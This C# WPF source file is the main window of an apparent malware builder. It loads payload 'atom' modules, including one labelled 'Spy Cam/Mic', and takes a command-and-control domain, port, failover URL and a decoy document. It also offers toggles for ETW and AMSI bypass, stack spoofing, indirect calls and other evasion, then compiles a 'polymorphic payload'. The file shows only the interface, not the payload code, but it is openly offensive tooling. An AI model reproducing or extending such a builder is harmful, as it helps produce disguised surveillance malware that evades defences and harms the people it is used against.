using System;
using System.Windows;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Controls;
using System.Windows.Media;

namespace Builder_GUI
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            PopulateAtomsDynamically();
        }

        private void PopulateAtomsDynamically()
        {
            try
            {
                // Try to find the root directory by traversing up from the EXE
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string atomsDir = "";
                
                // Search up to 6 levels up for the "Atoms" folder
                string currentSearch = baseDir;
                for (int i = 0; i < 6; i++)
                {
                    string check = Path.Combine(currentSearch, "Atoms");
                    if (Directory.Exists(check))
                    {
                        atomsDir = check;
                        break;
                    }
                    currentSearch = Path.GetDirectoryName(currentSearch) ?? "";
                    if (string.IsNullOrEmpty(currentSearch)) break;
                }

                if (!string.IsNullOrEmpty(atomsDir))
                {
                    txtLogs.Text += $"[*] Loading atoms from: {atomsDir}\n";
                    var files = Directory.GetFiles(atomsDir, "Atom_*.cpp");
                    
                    // Sort files by ID so they appear in order
                    System.Array.Sort(files);

                    // Add manual overrides for atoms that might not follow naming or just need explicit naming
                    var atomDisplayNames = new System.Collections.Generic.Dictionary<string, string>
                    {
                        { "14", "Spy Cam/Mic" }
                    };

                    foreach (var file in files)
                    {
                        string fileName = Path.GetFileNameWithoutExtension(file);
                        var match = Regex.Match(fileName, @"Atom_(\d+)_([A-Za-z0-9]+)");
                        if (match.Success)
                        {
                            string id = match.Groups[1].Value;
                            string name = match.Groups[2].Value;
                            
                            // Ensure ID is at least 2 digits for consistent UI display (01, 02, etc)
                            string paddedId = id.PadLeft(2, '0');
                            
                            // Use explicit name if available, otherwise use parsed name
                            string displayName = atomDisplayNames.ContainsKey(id) ? atomDisplayNames[id] : name;
                            
                            CheckBox cb = new CheckBox();
                            cb.Content = $"{displayName} ({paddedId})";
                            cb.IsChecked = true;
                            cb.Foreground = Brushes.White;
                            cb.Margin = new Thickness(5);
                            cb.IsEnabled = true;
                            
                            AtomPanel.Children.Add(cb);
                        }
                        else
                        {
                            // Fallback for atoms that might not match the name-part perfectly
                            var idMatch = Regex.Match(fileName, @"Atom_(\d+)");
                            if (idMatch.Success)
                            {
                                string id = idMatch.Groups[1].Value;
                                string paddedId = id.PadLeft(2, '0');
                                string displayName = atomDisplayNames.ContainsKey(id) ? atomDisplayNames[id] : "Unknown Atom";

                                CheckBox cb = new CheckBox();
                                cb.Content = $"{displayName} ({paddedId})";
                                cb.IsChecked = true;
                                cb.Foreground = Brushes.White;
                                cb.Margin = new Thickness(5);
                                AtomPanel.Children.Add(cb);
                            }
                        }
                    }
                }
                else
                {
                    AtomPanel.Children.Add(new TextBlock { Text = "Atoms directory not found in path search.", Foreground = Brushes.Red });
                    txtLogs.Text += "[!] ERROR: Could not locate Atoms directory.\n";
                }
            }
            catch (Exception ex)
            {
                AtomPanel.Children.Add(new TextBlock { Text = "Error loading atoms: " + ex.Message, Foreground = Brushes.Red });
            }
        }

        private async void BtnGenerate_Click(object sender, RoutedEventArgs e)
        {
            // Simulate the build process
            BtnGenerate.Content = "COMPILING...";
            BtnGenerate.IsEnabled = false;
            txtLogs.Text = "[+] Initializing Build Pipeline...\n";

            try
            {
                // Grab the values from the text boxes
                string domain = txtDomain.Text;
                string port = txtPort.Text;
                string pskId = txtPskId.Text.Trim();
                string decoyFile = txtDecoy.Text == "Drop or select file..." ? "" : txtDecoy.Text;
                
                // Collect selected atoms
                System.Collections.Generic.List<string> selectedAtoms = new System.Collections.Generic.List<string>();
                foreach (var child in AtomPanel.Children)
                {
                    if (child is CheckBox cb && cb.IsChecked == true)
                    {
                        var match = Regex.Match(cb.Content?.ToString() ?? "", @"\((\d+)\)");
                        if (match.Success)
                        {
                            // Parse as int to strip leading zeros, then back to string for clean output
                            selectedAtoms.Add(int.Parse(match.Groups[1].Value).ToString());
                        }
                    }
                }
                // Get auto-start sequence
                string autoStartOrder = txtOrder.Text;
                
                // Get failover URL
                string failoverUrl = txtFailover.Text.Trim();
                
                // Advanced Evasion Settings
                bool enableEtw = chkEtw.IsChecked == true;
                bool enableAmsi = chkAmsi.IsChecked == true;
                bool enableStack = chkStack.IsChecked == true;
                bool enablePayload = chkPayload.IsChecked == true;
                bool enableIndirect = chkIndirect.IsChecked == true;
                bool enableIpc = chkIpc.IsChecked == true;
                bool enableProxy = chkProxy.IsChecked == true;
                bool enableManager = chkManager.IsChecked == true;
                bool enableVeh = chkVeh.IsChecked == true;
                bool enableCleanup = chkCleanup.IsChecked == true;
                bool enableBloat = chkBloat.IsChecked == true;
                bool enableSpoof = chkSpoof.IsChecked == true;
                
                // Since dotnet run executes in Builder_GUI, the root is one level up
                PayloadCompiler compiler = new PayloadCompiler("..", ".\\Output", decoyFile, domain, port, selectedAtoms.ToArray(), autoStartOrder, failoverUrl, enableEtw, enableAmsi, enableStack, enablePayload, enableIndirect, enableIpc, enableProxy, enableManager, enableVeh, enableCleanup, enableBloat, enableSpoof, pskId);
                
                // Use Task.Run to keep the UI thread responsive
                bool success = await Task.Run(() => compiler.BuildPayload());
                
                // Final display of the logs in the UI
                txtLogs.Text = compiler.BuildLogs.ToString();

                if (success)
                {
                    MessageBox.Show("Compilation successful! Output saved in 'Output' folder.", 
                                    "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                else
                {
                    MessageBox.Show("Compilation failed. Check the Build Logs for errors.", 
                                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred:\n{ex.Message}", 
                                "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            finally
            {
                BtnGenerate.Content = "GENERATE POLYMORPHIC PAYLOAD";
                BtnGenerate.IsEnabled = true;
            }
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Select Decoy File (PDF, PNG, JPG)";
            openFileDialog.Filter = "All Files (*.*)|*.*|PDF Documents (*.pdf)|*.pdf|Images (*.png;*.jpg)|*.png;*.jpg";
            
            if (openFileDialog.ShowDialog() == true)
            {
                txtDecoy.Text = openFileDialog.FileName;
            }
        }
        private void SelectAllAtoms_Click(object sender, RoutedEventArgs e)
        {
            foreach (var child in AtomPanel.Children)
            {
                if (child is CheckBox cb) cb.IsChecked = true;
            }
        }

        private void SelectNoneAtoms_Click(object sender, RoutedEventArgs e)
        {
            foreach (var child in AtomPanel.Children)
            {
                if (child is CheckBox cb) cb.IsChecked = false;
            }
        }

        private void SelectAllOps_Click(object sender, RoutedEventArgs e)
        {
            chkEtw.IsChecked = true;
            chkAmsi.IsChecked = true;
            chkStack.IsChecked = true;
            chkPayload.IsChecked = true;
            chkIndirect.IsChecked = true;
            chkIpc.IsChecked = true;
            chkProxy.IsChecked = true;
            chkManager.IsChecked = true;
            chkVeh.IsChecked = true;
            chkCleanup.IsChecked = true;
        }

        private void SelectNoneOps_Click(object sender, RoutedEventArgs e)
        {
            chkEtw.IsChecked = false;
            chkAmsi.IsChecked = false;
            chkStack.IsChecked = false;
            chkPayload.IsChecked = false;
            chkIndirect.IsChecked = false;
            chkIpc.IsChecked = false;
            chkProxy.IsChecked = false;
            chkManager.IsChecked = false;
            chkVeh.IsChecked = false;
            chkCleanup.IsChecked = false;
        }
    }
}
